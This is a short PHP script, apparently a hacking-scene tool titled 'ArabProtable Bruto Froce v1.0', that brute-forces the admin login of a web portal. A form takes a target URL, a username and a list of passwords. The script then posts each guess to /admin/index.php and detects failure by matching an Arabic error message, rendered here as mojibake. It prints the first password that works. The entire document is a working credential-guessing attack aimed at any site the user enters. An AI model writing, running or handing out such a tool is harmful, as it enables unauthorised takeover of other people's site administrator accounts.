
<?php
function login($url,$user,$pass){
       $login = $url."/admin/index.php";
       $to = $url."/admin/index.php?sessID=";
       $data = array('user_name'=>$user,'user_pass'=>$pass);
       $ch = curl_init();
       curl_setopt($ch,CURLOPT_URL,$login);
       curl_setopt($ch,CURLOPT_POST,true);
       curl_setopt($ch,CURLOPT_POSTFIELDS,$data);
       curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
       $resut1 = curl_exec($ch);
       curl_close($ch);
       if(eregi("<td width='100%' align='center'><br>«”„ «·„” Œœ„ Êﬂ·„… «·„—Ê— «ÕœÂ„« €Ì— ’ÕÌÕ<br></td>",$resut1)){
            return false;
       }else{
             return true;
       }
       }

        if(!isset($_GET['start'])){
          echo '<title>ArabProtable Bruto Froce v1.0</title><br><br> <h1><center> Coded By Dr.5RaB</center></h1><center>
            <form method="POST" action="?start">
         TarGet   :<br>   <input name="target" type="text" value="http://www." size="50" /> <br />
         UserName :<br>   <input name="username" type="text" /><br />
         PassWord :<br>   <textarea clos"60" rows="6" name="passwords"></textarea> <br />
                          <input type="submit" value="Start">
            </form>';

 }else{
         $passwords = $_POST['passwords'];
		 $username = $_POST['username'];
	     $target = $_POST['target'];
		 $exp = explode("\n",$passwords);
		 
		 foreach($exp as $password){
		 if(login($target,$username,$password)){
		 echo "Password : $password";
		 break;
		}
		 }
		 
 }        
?>